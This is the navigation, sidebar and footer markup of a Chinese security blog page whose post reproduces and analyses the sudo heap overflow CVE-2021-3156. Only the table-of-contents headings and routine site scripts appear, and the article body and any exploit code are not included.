class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-text">背景知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-%E5%8E%9F%E8%AF%AD"><span class="toc-text">free 原语</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#For-open-euler-20-03"><span class="toc-text">For open euler 20.03</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-text">Patch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text">补充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/4199921919.html'
    this.page.identifier = 'posts/4199921919.html'
    this.page.title = 'CVE-2021-3156 sudo heap-based bufoverflow 复现&分析'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>